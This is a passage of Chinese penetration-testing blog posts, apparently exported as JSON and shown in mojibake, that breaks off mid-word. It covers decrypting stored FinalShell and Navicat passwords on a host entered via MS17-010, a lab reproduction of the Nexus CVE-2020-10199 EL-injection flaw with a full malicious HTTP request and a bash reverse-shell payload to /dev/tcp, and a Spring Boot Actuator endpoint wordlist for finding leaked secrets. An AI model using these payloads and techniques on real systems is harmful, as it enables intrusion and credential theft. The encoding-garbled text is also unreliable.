äºŒã€è¿ç»´è½¯ä»¶å½“æˆ‘é€šè¿‡ä¸€ä¸ªMS-17-010æ¼æ´RDPåˆ°å†…ç½‘è¿ç»´ä¸»æœºä¸Šé¢ï¼Œå‘ç°æ¡Œé¢æœ‰Navicatï¼ˆæ•°æ®åº“ç®¡ç†å·¥å…·ï¼‰å’ŒFinalShellï¼ˆæœåŠ¡å™¨è¿œç¨‹ç®¡ç†å·¥å…·ï¼‰ã€‚å½“ç„¶å’±è¦æƒ³åŠæ³•è§£å¯†è½¯ä»¶è¿æ¥è¿‡çš„æœåŠ¡å™¨å’Œæ•°æ®åº“çš„å¯†ç è·å¾—æ›´å¤šåˆ†æ•°ã€‚ 1ã€FinalShellFinalShellæ˜¯ä¸€ä½“åŒ–çš„çš„æœåŠ¡å™¨ç½‘ç»œç®¡ç†è½¯ä»¶ï¼Œä¸ä»…æ˜¯sshå®¢æˆ·ç«¯ï¼Œè¿˜æ˜¯åŠŸèƒ½å¼ºå¤§çš„å¼€å‘ã€è¿ç»´å·¥å…·ï¼Œå……åˆ†æ»¡è¶³å¼€å‘ã€è¿ç»´éœ€æ±‚ã€‚ 2ã€NavicatNavicatæ˜¯ä¸€å¥—å¯åˆ›å»ºå¤šä¸ªè¿æ¥çš„æ•°æ®åº“ç®¡ç†å·¥å…·ï¼Œç”¨ä»¥æ–¹ä¾¿ç®¡ç† MySQLã€Oracleã€PostgreSQLã€SQLiteã€SQL Serverã€MariaDBå’Œ/æˆ– MongoDB ç­‰ä¸åŒç±»å‹çš„æ•°æ®åº“ï¼Œå¹¶æ”¯æŒç®¡ç†æŸäº›äº‘æ•°æ®åº“ï¼Œä¾‹å¦‚é˜¿é‡Œäº‘ã€è…¾è®¯äº‘ã€‚ è¿æ¥ä¿¡æ¯æ˜¯å­˜åœ¨æ³¨å†Œè¡¨é‡Œé¢ æ•°æ®åº“ æ³¨å†Œè¡¨ä½ç½® MySQL HKEY_CURRENT_USER\\Software\\PremiumSoft\\Navicat\\Servers&lt;your connection name&gt; MariaDB HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMARIADB\\Servers&lt;your connection name&gt; MicrosoftSQL HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMSSQL\\Servers&lt;your connection name&gt; Oracle HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatOra\\Servers&lt;your connection name&gt; PostgreSQL HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatPG\\Servers&lt;your connection name&gt; SQLite HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatSQLite\\Servers&lt;your connection name&gt; MongoDB HKEY_CURRENT_USER\\Software\\PremiumSoft\\NavicatMONGODB\\Servers&lt;your connection name&gt; TeamViewerï¼ŒFileZillaï¼ŒWinSCPï¼ŒXmangagerç³»åˆ—äº§å“ï¼ˆXshell,Xftp)ç­‰å·¥å…· ä¸‰ã€è§£å¯†å§¿åŠ¿å·¥å…·åœ°å€ï¼š https://github.com/passer-W/FinalShell-Decoder https://github.com/uknowsec/SharpDecryptPwd FinallShell å¯†ç è§£å¯† å¯åœ¨æ–‡æœ¬æ¡†ä¸­ç›´æ¥è¾“å…¥è·¯å¾„æˆ–ç‚¹å‡»é€‰æ‹©æŒ‰é’®é€‰æ‹©FinalShellé…ç½®æ–‡ä»¶æ ¹è·¯å¾„ï¼Œä¸€èˆ¬åœ¨ **%FINALSHELL_INSTALL_PATH%/conn** ç›®å½•ä¸‹ï¼š ä¹Ÿå¯å°†è¿œç¨‹ä¸»æœºæ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°è§£å¯†ï¼Œè¾“å…¥åˆæ³•è·¯å¾„åè‡ªåŠ¨ç”Ÿæˆæ‰€æœ‰ä¸»æœºé…ç½®ä¿¡æ¯ï¼š å¯¹å¯†ç å·²ä¿å­˜åœ¨Windowsç³»ç»Ÿä¸Šçš„éƒ¨åˆ†ç¨‹åºè¿›è¡Œè§£æï¼ŒåŒ…æ‹¬ï¼šNavicatï¼ŒTeamViewerï¼ŒFileZillaï¼ŒWinSCPï¼ŒXmanagerç³»åˆ—äº§å“ï¼ˆXshellã€Xftpï¼‰ã€‚ä»¥Navicatä¸ºä¾‹ å››ã€å‚è€ƒé“¾æ¥https://mp.weixin.qq.com/s/etVdauWL4jbcY1yTKe5zkw","categories":[{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"https://wolke.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[],"author":"w01ke"},{"title":"CVE-2020-10199ï¼šNexus Repository Manager 3 groupåå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","slug":"Nexus-Repository-Manager-3-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2020-10199ï¼‰","date":"2023-02-06T02:56:21.000Z","updated":"2023-02-06T03:31:22.240Z","comments":true,"path":"post/bddc5cf6.html","link":"","permalink":"https://wolke.cn/post/bddc5cf6.html","excerpt":"","text":"ä¸€ã€ç®€ä»‹nexusçš„å…¨ç§°æ˜¯Nexus Repository Managerï¼Œæ˜¯Sonatypeå…¬å¸çš„ä¸€ä¸ªäº§å“ã€‚å®ƒæ˜¯ä¸€ä¸ªå¼ºå¤§çš„ä»“åº“ç®¡ç†å™¨ï¼Œæå¤§åœ°ç®€åŒ–äº†å†…éƒ¨ä»“åº“çš„ç»´æŠ¤å’Œå¤–éƒ¨ä»“åº“çš„è®¿é—®ã€‚ ä¸»è¦ç”¨å®ƒæ¥æ­å»ºå…¬å¸å†…éƒ¨çš„mavenç§æœã€‚ä½†æ˜¯å®ƒçš„åŠŸèƒ½ä¸ä»…ä»…æ˜¯åˆ›å»ºmavenç§æœ‰ä»“åº“è¿™ä¹ˆç®€å•ï¼Œè¿˜å¯ä»¥ä½œä¸ºnugetã€dockerã€npmã€bowerã€pypiã€rubygemsã€git lfsã€yumã€goã€aptç­‰çš„ç§æœ‰ä»“åº“ï¼ŒåŠŸèƒ½éå¸¸å¼ºå¤§ã€‚ äºŒã€æ¼æ´æ¦‚è¿°åœ¨ Nexus Repository Manager OSS/Pro 3.21.1 åŠä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œç”±äºåå°å­˜åœ¨ä¸€å¤„ä»»æ„ELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œå¯¼è‡´ç»è¿‡æˆæƒè®¤è¯çš„æ”»å‡»è€…ï¼Œå¯ä»¥åœ¨è¿œç¨‹é€šè¿‡æ„é€ æ¶æ„çš„ HTTP è¯·æ±‚ï¼Œåœ¨æœåŠ¡ç«¯æ‰§è¡Œä»»æ„æ¶æ„ä»£ç ï¼Œè·å–ç³»ç»Ÿæƒé™ã€‚æ­¤æ¼æ´çš„åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡ä»»æ„ç±»å‹çš„è´¦å·æƒé™ã€‚ ä¸‰ã€å½±å“ç‰ˆæœ¬Nexus Repository Manager OSS/Pro 3.x &lt;= 3.21.1 å››ã€ç½‘ç»œæµ‹ç»˜app=â€Nexus-Repository-Managerâ€ äº”ã€ç¯å¢ƒéƒ¨ç½²cd /usr/local/vulhub/nexus/CVE-2020-10199sudo docker-compose up -d å…­ã€æ¼æ´å¤ç°è®¿é—®ï¼šhttp://ip:8081 è¿›å…¥ç™»å½•é¡µé¢ å¼ºåˆ¶ä¿®æ”¹é»˜è®¤å£ä»¤ï¼ˆå¯è®¾ç½®ä¸ºåŸå£ä»¤/å¼±å£ä»¤ï¼‰ ä½¿ç”¨admin/adminç™»å½•åå°åï¼Œç™»å½•åä½¿ç”¨f12æ‰¾åˆ°cookieå¤åˆ¶å½“å‰çš„csrf-Token ä½¿ç”¨burpè¿›è¡ŒæŠ“åŒ…ï¼Œæ›¿æ¢ä»¥ä¸‹æ•°æ®åŒ…ï¼Œç„¶åæŠŠè‡ªå·±çš„cookieå’Œcsrf-Tokenç²˜è´´ä¸Šå»ï¼Œç„¶åå‘åŒ…å³å¯çœ‹åˆ°æ‰§è¡Œäº†9*9 POST /service/rest/beta/repositories/go/group HTTP/1.1Host: 192.168.64.139:8081Content-Length: 151X-Requested-With: XMLHttpRequestX-Nexus-UI: trueUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0NX-ANTI-CSRF-TOKEN: 0.13458863892030704Content-Type: application/jsonAccept: */*Origin: http://192.168.64.139:8081Referer: http://192.168.64.139:8081Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: NX-ANTI-CSRF-TOKEN=0.13458863892030704; NXSESSIONID=a576d9e8-10a7-4ba4-a8af-08cc63845895Connection: close&#123;&quot;name&quot;: &quot;internal&quot;,&quot;online&quot;: true,&quot;storage&quot;: &#123;&quot;blobStoreName&quot;: &quot;default&quot;,&quot;strictContentTypeValidation&quot;: true&#125;,&quot;group&quot;: &#123;&quot;memberNames&quot;: [&quot;$\\\\A&#123;9*9&#125;&quot;]&#125;&#125; æŠŠæ‰§è¡Œ9*9ä¿®æ”¹ä¸ºåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œè¿›å…¥dockerä¸­æŸ¥çœ‹åˆ›å»ºæˆåŠŸ $\\\\A&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethods()[6].invoke(null).exec(&#x27;touch /tmp/success&#x27;)&#125; ä½¿ç”¨ncè¿›è¡Œç›‘å¬ï¼Œæ‰§è¡Œåå¼¹shellæŠŠæ‰§è¡Œå†™å…¥æ–‡ä»¶çš„payloadä¿®æ”¹æˆåå¼¹shellçš„å‘½ä»¤ï¼Œç‚¹å‡»å‘é€æŸ¥çœ‹ncçš„ç›‘å¬çœ‹åˆ°è¿”å›äº†shell $\\\\A&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethods()[6].invoke(null).exec(&#x27;/bin/bash -c bash$IFS$9-i&gt;&amp;/dev/tcp/ip/port&lt;&amp;1&#x27;)&#125; ä¸ƒã€ä¿®å¤å»ºè®®å‡çº§è‡³æœ€æ–°ç‰ˆæœ¬","categories":[{"name":"æ¼æ´åˆ†æ","slug":"æ¼æ´åˆ†æ","permalink":"https://wolke.cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"Nexus","slug":"Nexus","permalink":"https://wolke.cn/tags/Nexus/"}],"author":"w01ke"},{"title":"å¯¹äºSpring Bootçš„æ¸—é€å§¿åŠ¿","slug":"å¯¹äºSpring-Bootçš„æ¸—é€å§¿åŠ¿","date":"2023-01-31T05:50:11.000Z","updated":"2023-01-31T06:14:24.617Z","comments":true,"path":"post/115ad433.html","link":"","permalink":"https://wolke.cn/post/115ad433.html","excerpt":"","text":"æ–‡ç« è½¬è½½äºhttps://blog.zgsec.cn/index.php/archives/129/ ä¸€ã€Spring Bootæ¦‚è¿°Spring Boot æ˜¯ç”±Pivotalå›¢é˜Ÿæä¾›çš„å…¨æ–°æ¡†æ¶ï¼Œå…¶è®¾è®¡ç›®çš„æ˜¯ç”¨æ¥ç®€åŒ– Spring åº”ç”¨çš„åˆ›å»ºã€è¿è¡Œã€è°ƒè¯•ã€éƒ¨ç½²ç­‰ã€‚ä½¿ç”¨ Spring Boot å¯ä»¥åšåˆ°ä¸“æ³¨äº Spring åº”ç”¨çš„å¼€å‘ï¼Œè€Œæ— éœ€è¿‡å¤šå…³æ³¨ XML çš„é…ç½®ã€‚Spring Boot ä½¿ç”¨â€œä¹ æƒ¯ä¼˜äºé…ç½®â€çš„ç†å¿µï¼Œç®€å•æ¥è¯´ï¼Œå®ƒæä¾›äº†ä¸€å †ä¾èµ–æ‰“åŒ…ï¼Œå¹¶å·²ç»æŒ‰ç…§ä½¿ç”¨ä¹ æƒ¯è§£å†³äº†ä¾èµ–é—®é¢˜ã€‚ä½¿ç”¨ Spring Boot å¯ä»¥ä¸ç”¨æˆ–è€…åªéœ€è¦å¾ˆå°‘çš„ Spring é…ç½®å°±å¯ä»¥è®©ä¼ä¸šé¡¹ç›®å¿«é€Ÿè¿è¡Œèµ·æ¥ã€‚ Spring Boot æ˜¯å¼€å‘è€…å’Œ Spring æœ¬èº«æ¡†æ¶çš„ä¸­é—´å±‚ï¼Œå¸®åŠ©å¼€å‘è€…ç»Ÿç­¹ç®¡ç†åº”ç”¨çš„é…ç½®ï¼Œæä¾›åŸºäºå®é™…å¼€å‘ä¸­å¸¸è§é…ç½®çš„é»˜è®¤å¤„ç†ï¼ˆå³ä¹ æƒ¯ä¼˜äºé…ç½®ï¼‰ï¼Œç®€åŒ–åº”ç”¨çš„å¼€å‘ï¼Œç®€åŒ–åº”ç”¨çš„è¿ç»´ï¼›æ€»çš„æ¥è¯´ï¼Œå…¶ç›®çš„ Spring Boot å°±æ˜¯ä¸ºäº†å¯¹ Java web çš„å¼€å‘è¿›è¡Œâ€œç®€åŒ–â€å’ŒåŠ â€œå¿«â€é€Ÿåº¦ï¼Œç®€åŒ–å¼€å‘è¿‡ç¨‹ä¸­å¼•å…¥æˆ–å¯åŠ¨ç›¸å…³ Spring åŠŸèƒ½çš„é…ç½®ã€‚è¿™æ ·å¸¦æ¥çš„å¥½å¤„å°±æ˜¯é™ä½å¼€å‘äººå‘˜å¯¹äºæ¡†æ¶çš„å…³æ³¨ç‚¹ï¼Œå¯ä»¥æŠŠæ›´å¤šçš„ç²¾åŠ›æ”¾åœ¨è‡ªå·±çš„ä¸šåŠ¡ä»£ç ä¸Šã€‚ äºŒã€Spring Boot Actuatoræ¦‚è¿°Actuator æ˜¯ Spring Boot æä¾›çš„ç”¨æ¥å¯¹åº”ç”¨ç³»ç»Ÿè¿›è¡Œè‡ªçœå’Œç›‘æ§çš„åŠŸèƒ½æ¨¡å—ï¼Œå€ŸåŠ©äº Actuator å¼€å‘è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¯¹åº”ç”¨ç³»ç»ŸæŸäº›ç›‘æ§æŒ‡æ ‡è¿›è¡ŒæŸ¥çœ‹ã€ç»Ÿè®¡ç­‰ã€‚ Actuator çš„æ ¸å¿ƒæ˜¯ç«¯ç‚¹ Endpointï¼Œå®ƒç”¨æ¥ç›‘è§†åº”ç”¨ç¨‹åºåŠäº¤äº’ï¼Œspring-boot-actuator ä¸­å·²ç»å†…ç½®äº†éå¸¸å¤šçš„ Endpointï¼ˆhealthã€infoã€beansã€metricsã€httptraceã€shutdownç­‰ç­‰ï¼‰ï¼ŒåŒæ—¶ä¹Ÿå…è®¸æˆ‘ä»¬è‡ªå·±æ‰©å±•è‡ªå·±çš„ Endpointsã€‚æ¯ä¸ª Endpoint éƒ½å¯ä»¥å¯ç”¨å’Œç¦ç”¨ã€‚è¦è¿œç¨‹è®¿é—® Endpointï¼Œè¿˜å¿…é¡»é€šè¿‡ JMX æˆ– HTTP è¿›è¡Œæš´éœ²ï¼Œå¤§éƒ¨åˆ†åº”ç”¨é€‰æ‹©HTTPã€‚ Actuator åœ¨å¸¦æ¥æ–¹ä¾¿çš„åŒæ—¶ï¼Œå¦‚æœæ²¡æœ‰ç®¡ç†å¥½ï¼Œä¼šå¯¼è‡´ä¸€äº›æ•æ„Ÿçš„ä¿¡æ¯æ³„éœ²ï¼›å¯èƒ½ä¼šå¯¼è‡´æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œè¢«æš´éœ²åˆ°å¤–ç½‘ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šæ²¦é™·ã€‚ ä¸‰ã€Spring Bootæ¡†æ¶çš„è¯†åˆ«1ã€é€šè¿‡iconå›¾æ ‡è¿›è¡Œè¯†åˆ«Fofaè¯­æ³• icon_hash=&quot;116323821&quot; å¯ä»¥æœç´¢åˆ°25ä¸‡æ¡å·¦å³çš„èµ„äº§æ•°æ®ï¼Œè¯´æ˜Spring Bootæ¡†æ¶æ˜¯åº”ç”¨å¹¿æ³›å“ˆå“ˆ~ï¼ˆå…¶ä¸­è¿˜æœ‰å¾ˆå¤šæœåŠ¡æ›´æ”¹äº†é»˜è®¤çš„icoå›¾æ ‡ï¼Œæ‰€ä»¥è¿™ä¸ªè¯­æ³•æ‰¾ä¸åˆ°ï¼‰ 2ã€é€šè¿‡ç½‘é¡µå†…å®¹è¿›è¡Œè¯†åˆ«å“ˆå“ˆï¼Œè¿™ä¸ªæ›´å¤¸å¼ äº†ï¼Œå¯ä»¥æœç´¢åˆ°141ä¸‡æ¡å·¦å³çš„èµ„äº§æ•°æ® ä»¥ä¸‹æ˜¯ Spring Boot æ¡†æ¶çš„å…¸å‹ç‰¹å¾ï¼š æ‰€ä»¥å¯ä»¥é€šè¿‡Fofaå¯¹ç½‘é¡µçš„bodyå†…å®¹è¿›è¡Œæœç´¢æ‰¾åˆ°é‚£ä¹ˆå¤šçš„èµ„äº§ 3ã€Spring Bootæ¡†æ¶ æ•æ„Ÿä¿¡æ¯æ³„éœ²å¦‚æœå¯¹ Spring Boot æ¡†æ¶ç†Ÿæ‚‰çš„å¸ˆå‚…ï¼Œè‚¯å®šçŸ¥é“å¯¹ Spring Boot çš„æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œè‚¯å®šä¸ä¼šå°‘äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²å’Œæœªæˆæƒè®¿é—®ç›¸å…³çš„æ¼æ´ ä¸åŒç‰ˆæœ¬åˆ†ç±»è®¨è®º Spring Boot &lt; 1.5ï¼šé»˜è®¤æœªæˆæƒè®¿é—®æ‰€æœ‰ç«¯ç‚¹ Spring Boot &gt;= 1.5ï¼šé»˜è®¤åªå…è®¸è®¿é—® /health å’Œ /info ç«¯ç‚¹ï¼Œä½†æ˜¯æ­¤å®‰å…¨æ€§é€šå¸¸è¢«åº”ç”¨ç¨‹åºå¼€å‘äººå‘˜ç¦ç”¨äº† ï¼ˆ1ï¼‰å¸¸è§ç«¯ç‚¹åŠå…¶ä½œç”¨ è·¯å¾„ æ˜¯å¦é»˜è®¤å¯ç”¨ åŠŸèƒ½æè¿° /auditevents æ˜¯ æ˜¾ç¤ºå½“å‰åº”ç”¨ç¨‹åºçš„å®¡è®¡äº‹ä»¶ä¿¡æ¯ /beans æ˜¯ æ˜¾ç¤ºä¸€ä¸ªåº”ç”¨ä¸­æ‰€æœ‰Spring Beansçš„å®Œæ•´åˆ—è¡¨ /conditions æ˜¯ æ˜¾ç¤ºé…ç½®ç±»å’Œè‡ªåŠ¨é…ç½®ç±»çš„çŠ¶æ€åŠå®ƒä»¬è¢«åº”ç”¨æˆ–æœªè¢«åº”ç”¨çš„åŸå›  /configprops æ˜¯ æ˜¾ç¤ºä¸€ä¸ªæ‰€æœ‰@ConfigurationPropertiesçš„é›†åˆåˆ—è¡¨ /env æ˜¯ æ˜¾ç¤ºæ¥è‡ªSpringçš„ ConfigurableEnvironmentçš„å±æ€§ /flyway æ˜¯ æ˜¾ç¤ºæ•°æ®åº“è¿ç§»è·¯å¾„ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ /health æ˜¯ æ˜¾ç¤ºåº”ç”¨çš„å¥åº·ä¿¡æ¯ï¼ˆå½“ä½¿ç”¨ä¸€ä¸ªæœªè®¤è¯è¿æ¥è®¿é—®æ—¶æ˜¾ç¤ºä¸€ä¸ªç®€å•çš„â€™statusâ€™ï¼Œä½¿ç”¨è®¤è¯è¿æ¥è®¿é—®åˆ™æ˜¾ç¤ºå…¨éƒ¨ä¿¡æ¯è¯¦æƒ…ï¼‰ /info æ˜¯ æ˜¾ç¤ºä»»æ„çš„åº”ç”¨ä¿¡æ¯ /liquibase æ˜¯ å±•ç¤ºä»»ä½•Liquibaseæ•°æ®åº“è¿ç§»è·¯å¾„ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ /metrics æ˜¯ å±•ç¤ºå½“å‰åº”ç”¨çš„metricsä¿¡æ¯ /mappings æ˜¯ æ˜¾ç¤ºä¸€ä¸ªæ‰€æœ‰@RequestMappingè·¯å¾„çš„é›†åˆåˆ—è¡¨ /scheduledtasks æ˜¯ æ˜¾ç¤ºåº”ç”¨ç¨‹åºä¸­çš„è®¡åˆ’ä»»åŠ¡ /sessions å¦ å…è®¸ä»Springä¼šè¯æ”¯æŒçš„ä¼šè¯å­˜å‚¨ä¸­æ£€ç´¢å’Œåˆ é™¤ç”¨æˆ·ä¼šè¯ /shutdown å¦ å…è®¸åº”ç”¨ä»¥ä¼˜é›…çš„æ–¹å¼å…³é—­ï¼ˆé»˜è®¤æƒ…å†µä¸‹ä¸å¯ç”¨ï¼‰ /threaddump æ˜¯ æ‰§è¡Œä¸€ä¸ªçº¿ç¨‹dump /heapdump æ˜¯ è¿”å›ä¸€ä¸ªGZipå‹ç¼©çš„hprofå †dumpæ–‡ä»¶ /jolokia æ˜¯ é€šè¿‡HTTPæš´éœ²JMX beansï¼ˆå½“Jolokiaåœ¨ç±»è·¯å¾„ä¸Šæ—¶ï¼ŒWebFluxä¸å¯ç”¨ï¼‰ /logfile æ˜¯ è¿”å›æ—¥å¿—æ–‡ä»¶å†…å®¹ï¼ˆå¦‚æœè®¾ç½®äº†logging.fileæˆ–logging.pathå±æ€§çš„è¯ï¼‰ï¼Œæ”¯æŒä½¿ç”¨HTTP Rangeå¤´æ¥æ”¶æ—¥å¿—æ–‡ä»¶å†…å®¹çš„éƒ¨åˆ†ä¿¡æ¯ /prometheus æ˜¯ ä»¥å¯ä»¥è¢«PrometheusæœåŠ¡å™¨æŠ“å–çš„æ ¼å¼æ˜¾ç¤ºmetricsä¿¡æ¯ ï¼ˆ2ï¼‰ç‹¬å®¶å­—å…¸äºæ˜¯ï¼Œæˆ‘è¿™é‡Œç‹¬å®¶æ•´ç†äº†ä¸€ä»½ä¿¡æ¯æ³„éœ²å­—å…¸ï¼ˆæ¬¢è¿è¡¥å……å“ˆå“ˆï¼‰ actuatoractuator/auditLogactuator/auditeventsactuator/autoconfigactuator/beansactuator/cachesactuator/conditionsactuator/configurationMetadataactuator/configpropsactuator/dumpactuator/envactuator/eventsactuator/exportRegisteredServicesactuator/featuresactuator/flywayactuator/healthactuator/heapdumpactuator/healthcheckactuator/heapdumpactuator/httptraceactuator/hystrix.streamactuator/infoactuator/integrationgraphactuator/jolokiaactuator/logfileactuator/loggersactuator/loggingConfigactuator/liquibaseactuator/metricsactuator/mappingsactuator/scheduledtasksactuator/swagger-ui.htmlactuator/prometheusactuator/refreshactuator/registeredServicesactuator/releaseAttributesactuator/resolveAttributesactuator/scheduledtasksactuator/sessionsactuator/springWebflowactuator/shutdownactuator/ssoactuator/ssoSessionsactuator/statisticsactuator/statusactuator/threaddumpactuator/traceauditeventsautoconfigapi.htmlapi/index.htmlapi/swagger-ui.htmlapi/v2/api-docsapi-docsbeanscachescloudfoundryapplicationconditionsconfigpropsdistv2/index.htmldocsdruid/index.htmldruid/login.htmldruid/websession.htmldubbo-provider/distv2/index.htmldumpentity/allenvenv/(name)eurekaflywaygateway/actuatorgateway/actuator/auditeventsgateway/actuator/beansgateway/actuator/conditionsgateway/actuator/configpropsgateway/actuator/envgateway/actuator/healthgateway/actuator/heapdumpgateway/actuator/httptracegateway/actuator/hystrix.streamgateway/actuator/infogateway/actuator/jolokiagateway/actuator/logfilegateway/actuator/loggersgateway/actuator/mappingsgateway/actuator/metricsgateway/actuator/scheduledtasksgateway/actuator/swagger-ui.htmlgateway/actuator/threaddumpgateway/actuator/tracehealthheapdumpheapdump.jsonhttptracehystrixhystrix.streaminfointegrationgraphjolokiajolokia/listliquibaselistlogfileloggersliquibasemetricsmappingsmonitorprometheusrefreshscheduledtaskssessionsshutdownspring-security-oauth-resource/swagger-ui.htmlspring-security-rest/api/swagger-ui.htmlstatic/swagger.jsonsw/swagger-ui.htmlswaggerswagger/codesswagger/index.htmlswagger/static/index.htmlswagger/swagger-ui.htmlswagger-dubbo/api-docsswagger-uiswagger-ui.htmlswagger-ui/htmlswagger-ui/index.htmlsystem/druid/index.htmlthreaddumptemplate/swagger-ui.htmltraceuser/swagger-ui.htmlversionv1.1/swagger-ui.htmlv1.2/swagger-ui.htmlv1.3/swagger-ui.htmlv1.4/swagger-ui.htmlv1.5/swagger-ui.htmlv1.6/swagger-ui.htmlv1.7/swagger-ui.html/v1.8/swagger-ui.html/v1.9/swagger-ui.html/v2.0/swagger-ui.htmlv2.1/swagger-ui.htmlv2.2/swagger-ui.htmlv2.3/swagger-ui.htmlv2/swagger.jsonwebpage/system/druid/index.html%20/swagger-ui.html ï¼ˆ3ï¼‰ç«¯ç‚¹çš„æ•æ„Ÿä¿¡æ¯æ³„éœ²æ ·ä¾‹è¿™é‡Œå…ˆå®‰åˆ©ä¸€æ¬¾è°·æ­Œæµè§ˆå™¨æ’ä»¶å“ˆï¼Œåå­—å« JSON Viewer ï¼Œå¯ä»¥ç¾åŒ–JSONçš„ç›¸å…³é¡µé¢ aã€è®¿é—®/actuatorå¦‚æœè®¾ç½®äº† management.endpoints.web.exposure.include ä¸º *ï¼Œå°±å¯ä»¥åœ¨ /actuator çœ‹åˆ°æ‰€æœ‰å­˜åœ¨çš„ç«¯ç‚¹ï¼Œæˆªå›¾å¦‚ä¸‹ï¼š bã€è®¿é—®/actuator/versionä¼šæ³„éœ²ä¸€äº›ç›¸å…³çš„ç‰ˆæœ¬ä¿¡æ¯ ä½†è¿™ä¸ªç›®å‰å¾ˆå°‘æœ‰æ³„éœ²äº†ï¼Œä¸€æ—¶åŠä¼šæ²¡æ‰¾åˆ°å®ä¾‹ cã€è®¿é—®/envæˆ–è€…/actuator/envå¯èƒ½ä¼šæ³„éœ²æ•°æ®åº“è´¦å·å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ é’ˆå¯¹envè¿™ç§è·¯å¾„ä¸‹æ³„éœ²çš„å¯†ç ä¼šç”¨æ˜Ÿå·è¿›è¡Œè„±æ•ï¼Œæƒ³è¦è·å–ç›¸åº”çš„æ˜æ–‡å¯†ç ï¼Œå¯ä»¥å°è¯•é€šè¿‡åˆ†æheapdumpæ•°æ®çš„æ–¹å¼ dã€è®¿é—®/actuator/metricsè·å¾—æ¯ä¸ªåº¦é‡çš„åç§°ï¼Œå…¶ä¸­ä¸»è¦ç›‘æ§äº†JVMå†…å®¹ä½¿ç”¨ã€GCæƒ…å†µã€ç±»åŠ è½½ä¿¡æ¯ç­‰ å¦‚æœæƒ³è¦å¾—åˆ°æ¯ä¸ªåº¦é‡çš„è¯¦ç»†ä¿¡æ¯ï¼Œéœ€è¦ä¼ é€’åº¦é‡çš„åç§°åˆ°URLä¸­ï¼Œå¦‚ä¸‹ http://xx.xx.xx.xx/actuator/metrics/http.server.requests eã€è®¿é—®/actuator/threaddumpè·å–æœåŠ¡å™¨çš„çº¿ç¨‹å †æ ˆä¿¡æ¯ fã€è®¿é—®/actuator/loggersè·å–æœåŠ¡å™¨çš„æ—¥å¿—çº§åˆ« gã€è®¿é—®/actuator/configpropsæŸ¥çœ‹é…ç½®æ–‡ä»¶ä¸­è®¾ç½®çš„å±æ€§å†…å®¹ï¼Œä»¥åŠä¸€äº›é…ç½®å±æ€§çš„é»˜è®¤å€¼ hã€è®¿é—®/actuator/infoå±•ç¤ºäº†å…³äºåº”ç”¨çš„ä¸€èˆ¬ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯ä»ç¼–è¯‘æ–‡ä»¶æ¯”å¦‚ META-INF/build-info.properties æˆ–è€… git æ–‡ä»¶æ¯”å¦‚ git.properties æˆ–è€…ä»»ä½•ç¯å¢ƒçš„ property ä¸­è·å– iã€è®¿é—®/actuator/mappingså“åº”ä¿¡æ¯æè¿°å…¨éƒ¨çš„URIè·¯å¾„ï¼Œä»¥åŠå®ƒä»¬å’Œæ§åˆ¶å™¨çš„æ˜ å°„å…³ç³» jã€è®¿é—®/actuator/healthhealthä¸€èˆ¬åªå±•ç¤ºäº†ç®€å•çš„UPå’ŒDOWNçŠ¶æ€ï¼Œæ¯”å¦‚è¿™æ ·ï¼š ä¸ºäº†è·å¾—å¥åº·æ£€æŸ¥ä¸­æ‰€æœ‰æŒ‡æ ‡çš„è¯¦ç»†ä¿¡æ¯ï¼Œå°±éœ€è¦é€šè¿‡åœ¨ application.yaml ä¸­å¢åŠ å¦‚ä¸‹å†…å®¹ï¼š management: endpoint: health: show-details: always ä¸€æ—¦æ‰“å¼€ä¸Šè¿°å¼€å…³ï¼Œé‚£ä¹ˆåœ¨ /health ä¸­å¯ä»¥çœ‹åˆ°è¯¦ç»†å†…å®¹ï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ · &#123; &quot;status&quot;: &quot;UP&quot;, &quot;diskSpace&quot;: &#123; &quot;status&quot;: &quot;UP&quot;, &quot;total&quot;: 209715195904, &quot;free&quot;: 183253909504, &quot;threshold&quot;: 10485760 &#125; &quot;db&quot;: &#123; &quot;status&quot;: &quot;UP&quot;, &quot;database&quot;: &quot;MySQL&quot;, &quot;hello&quot;: 1 &#125;&#125; kã€è®¿é—®/heapdumpæˆ–è€…/actuator/heapdumpHeap Dumpä¹Ÿå«å †è½¬å‚¨æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªJavaè¿›ç¨‹åœ¨æŸä¸ªæ—¶é—´ç‚¹ä¸Šçš„å†…å­˜å¿«ç…§ Heap Dumpæ˜¯æœ‰ç€å¤šç§ç±»å‹çš„ï¼Œä¸è¿‡æ€»ä½“ä¸Šheap dumpåœ¨è§¦å‘å¿«ç…§çš„æ—¶å€™éƒ½ä¿å­˜äº†javaå¯¹è±¡å’Œç±»çš„ä¿¡æ¯ é€šå¸¸åœ¨å†™heap 